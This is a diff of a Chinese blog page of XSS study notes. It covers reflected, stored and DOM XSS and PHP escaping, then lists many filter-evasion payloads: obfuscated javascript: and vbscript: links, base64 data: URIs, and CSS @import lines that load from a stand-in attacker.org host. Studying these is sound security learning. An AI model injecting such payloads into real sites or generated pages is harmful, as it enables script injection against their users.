@@ -158,26 +158,12 @@
         <div class="post-content">
             <pre><code>                              xss漏洞学习笔记
 </code></pre>
-<!--
-xss实质是指html和javascript代码的注入
-
-    XSS被恶意使用的三种方法：
-1.窃取Cookie值
-2.通过JavaScript攻击
-3.篡改网页
-
-xss的分类：
-按形式分：反射型XSS 存储型XSS
-按介质分：JSXSS FlashXSS
-按接口分：DOM base XSS , 非DOM XSS
-注：因此没有反射型XSS、存储型XSS、DOM XSS这种分类，因为分类依据都不同…
-
-1.反射型：（不持久型xss）
-    与服务器交互，但是交互的数据一般不会被存放在数据库中，一次性，所见即所得，一般出现在查询类页面上等。
-  <!--  一般是<script>alert(123)</script>   -->
-<ol start="2">
-<li>存储型：（持久型xss）<br> 交互的数据会被存放在数据库中，永久性存储，一般出现在留言板，注册等页面。 <!--一般是#<a href='' onclick=alert('xss')>click</a>    --></li>
-</ol>
+<p>xss实质是指html和javascript代码的注入</p>
+<pre><code>XSS被恶意使用的三种方法：
+</code></pre>
+<p>1.窃取Cookie值<br>2.通过JavaScript攻击<br>3.篡改网页</p>
+<p>xss的分类：<br>按形式分：反射型XSS 存储型XSS<br>按介质分：JSXSS FlashXSS<br>按接口分：DOM base XSS , 非DOM XSS<br>注：因此没有反射型XSS、存储型XSS、DOM XSS这种分类，因为分类依据都不同…</p>
+<p>1.反射型：（不持久型xss）<br>    与服务器交互，但是交互的数据一般不会被存放在数据库中，一次性，所见即所得，一般出现在查询类页面上等。<br>  <!--  一般是<script>alert(123)</script>   --><br>2. 存储型：（持久型xss）<br>    交互的数据会被存放在数据库中，永久性存储，一般出现在留言板，注册等页面。<br>    <!--一般是#<a href='' onclick=alert('xss')>click</a>    --></p>
 <p>3.DOM型：<br>    不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的漏洞，大部分属于反射型，少部分属于存储型。</p>
 <p>xss可能存在的漏洞：<br>    有用户输入输出的地方，用户交互等一些地方，都可能存在xss漏洞。</p>
 <p>PHP转义函数：</p>
@@ -191,7 +177,7 @@ xss的分类：
 <p>&amp;	        &amp;amp；	支持	                             支持                   支持<br>“	        &amp;quot；	不支持	                     支持 	               支持<br>’	        &amp;#39；	不支持	                   不支持	               支持<br>一般使用最后一种即可：ENT_QUOTES</p>
 </blockquote>
 <p>$charset：字符编码。如UTF-8、GBK。</p>
-<p>payload：<br>#第一类：Javascript URL<br><a href="javascript:alert('test')">link</a><br><a href="java&#115;cript:alert('xss')">link</a><br><a href='vbscript:MsgBox("XSS")'>link</a><br><a href="vbscript:alert(1)">Hello</a><br><a href="vbscript&#058;alert(1)">Hello</a><br><a href=javascript:alert(&quot;XSS&quot;)>link</a><br>&lt;a href&#x3D;<code>javascript:alert(&quot;RSnake says,&#39;XSS&#39;&quot;)</code>&gt;link</a><br><a href=javascript:alert(String.fromCharCode(88,83,83))>link</a><br><a href="javascript&colon;alert(1)">link</a><br><a href="javaSCRIPT&colon;alert(1)">Hello</a><br><a href="javasc&NewLine;ript&colon;alert(1)">link</a><br><a href="javas&Tab;cript:\u0061lert(1);">Hello</a><br><a href="jav    ascript:alert('XSS')">link</a><br><a href="jav&#x09;ascript:alert('XSS')">link</a><br><a href="jav&#x0D;ascript:alert('XSS')">link</a><br><a href=" &#14;  javascript:alert('XSS');">link</a><br><a href="javascript:\u0061lert&#x28;1&#x29">Hello</a><br><a href="javascript:confirm`1`">link</a><br><a href="javascript:confirm(1)">link</a><br><a href="j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1)">1</a><br><a href="javascript:%61%6c%65%72%74%28%31%29">link</a><br><a href="javascript:\u0061\u006C\u0065\u0072\u0074(1)">link</a><br>&lt;a href&#x3D;javascript:eval(“\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29”)&gt;2</a><br>&lt;a href&#x3D;javascript:eval(“&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#120;&#115;&#115;&#39;&#41;”)&gt;link</a><br><a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>link</a><br><a href=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>link</a><br><a href=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>link</a><br><a href="data:text/html;base64,amF2YXNjcmlwdDphbGVydCgxKQ==">test</a><br><a href=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>1</a><br>&lt;iframe&#x2F;src&#x3D;”data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg&#x3D;&#x3D;”&gt;</p>
+<p>payload：&lt;!–<br>#第一类：Javascript URL<br><a href="javascript:alert('test')">link</a><br><a href="java&#115;cript:alert('xss')">link</a><br><a href='vbscript:MsgBox("XSS")'>link</a><br><a href="vbscript:alert(1)">Hello</a><br><a href="vbscript&#058;alert(1)">Hello</a><br><a href=javascript:alert(&quot;XSS&quot;)>link</a><br>&lt;a href&#x3D;<code>javascript:alert(&quot;RSnake says,&#39;XSS&#39;&quot;)</code>&gt;link</a><br><a href=javascript:alert(String.fromCharCode(88,83,83))>link</a><br><a href="javascript&colon;alert(1)">link</a><br><a href="javaSCRIPT&colon;alert(1)">Hello</a><br><a href="javasc&NewLine;ript&colon;alert(1)">link</a><br><a href="javas&Tab;cript:\u0061lert(1);">Hello</a><br><a href="jav    ascript:alert('XSS')">link</a><br><a href="jav&#x09;ascript:alert('XSS')">link</a><br><a href="jav&#x0D;ascript:alert('XSS')">link</a><br><a href=" &#14;  javascript:alert('XSS');">link</a><br><a href="javascript:\u0061lert&#x28;1&#x29">Hello</a><br><a href="javascript:confirm`1`">link</a><br><a href="javascript:confirm(1)">link</a><br><a href="j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1)">1</a><br><a href="javascript:%61%6c%65%72%74%28%31%29">link</a><br><a href="javascript:\u0061\u006C\u0065\u0072\u0074(1)">link</a><br>&lt;a href&#x3D;javascript:eval(“\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29”)&gt;2</a><br>&lt;a href&#x3D;javascript:eval(“&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#120;&#115;&#115;&#39;&#41;”)&gt;link</a><br><a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>link</a><br><a href=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>link</a><br><a href=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>link</a><br><a href="data:text/html;base64,amF2YXNjcmlwdDphbGVydCgxKQ==">test</a><br><a href=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>1</a><br>&lt;iframe&#x2F;src&#x3D;”data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg&#x3D;&#x3D;”&gt;</p>
 <p>#第二类：CSS import</p>
 <style>@import url("http://attacker.org/malicious.css");</style>
 <style>@imp\ort url("http://attacker.org/malicious.css");</style>
